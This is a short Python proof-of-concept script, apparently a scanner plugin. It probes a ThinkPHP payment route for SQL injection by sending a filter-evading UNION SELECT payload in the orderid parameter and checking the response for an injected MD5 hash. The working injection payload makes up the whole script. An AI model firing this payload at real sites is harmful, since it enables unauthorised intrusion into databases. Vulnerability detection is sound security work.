"""  
@Time: 2024/2/28 16:44 
@Auth: Y5neKO
@File: Thinkphp_pay_orderid_sqli.py 
@IDE: PyCharm 
"""
import requests
import urllib.parse


def run(url, timeout):
    result = {
        'name': 'Thinkphp_pay_orderid_sqli',
        'vulnerable': False,
        'method': None,
        'url': None,
        'payload': None
    }
    headers = {
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    try:
        vurl = url + '/index.php?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/Md5(2333)--+'
        req = requests.get(vurl, headers=headers, timeout=timeout, verify=False)
        if "56540676a129760a" in req.text:
            result['vulnerable'] = True
            result['method'] = 'GET'
            result['url'] = url
            result['payload'] = vurl
        return result
    except Exception as e:
        print(e)
        return result
